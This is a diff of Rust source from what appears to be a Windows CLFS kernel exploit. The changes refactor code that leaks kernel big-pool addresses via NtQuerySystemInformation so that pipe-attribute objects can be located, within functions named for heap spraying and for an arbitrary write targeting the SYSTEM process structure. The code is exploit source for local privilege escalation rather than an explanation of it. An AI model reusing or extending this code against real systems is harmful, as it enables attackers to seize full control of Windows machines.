@@ -449,8 +449,6 @@ fn get_big_pool_info(clfs_pools: &mut ClfsPools){
     let bigpool_buffer = nt_helper::nt_system_big_pool_infomation_helper();
 
     if let Ok(bigpool_buffer) = bigpool_buffer {
-        //SystemBigPoolInformation이 성공한 상태
-    
         let info = unsafe {
             &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
         };
@@ -734,7 +732,6 @@ fn heap_spray(){
 }
 
 fn pipe_arbitrary_write_values(h_pipe: &mut Pipeline, system_eprocess: usize){
-
     const PIPE_ATTRIBUTE_INPUT_SIZE: u32 = 0xFD8;
     const PIPE_ATTRIBUTE_OUTPUT_SIZE: u32 = 0x100;
 
@@ -782,28 +779,8 @@ fn pipe_arbitrary_write_values(h_pipe: &mut Pipeline, system_eprocess: usize){
         println!("fail make pipe")
     }
 
-    //위에서 등록한 pipe_attribute는 커널메모리에 존재하므로, 위치를 찾는다.
-    let mut buffer_size: u32 = 0;
-    let mut bigpool_buffer:Vec<u32> = Vec::new();
+    let bigpool_buffer = nt_helper::nt_system_big_pool_infomation_helper().expect("write_value_fail");
 
-    bigpool_buffer.resize(10, 0);
-    
-    loop{
-        let status: NTSTATUS = unsafe {
-            NtQuerySystemInformation(
-                SystemInformationClass::SystemBigPoolInformation,
-                bigpool_buffer.as_mut_ptr().cast::<c_void>(),
-                buffer_size,
-                &mut buffer_size,
-            )
-        };
-        if status == STATUS_INFO_LENGTH_MISMATCH {
-            bigpool_buffer.resize((buffer_size + 1) as usize, 0);
-            continue;
-        }
-        break;
-    }
-    //SystemBigPoolInformation이 성공한 상태
     let info = unsafe {
         &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
     };
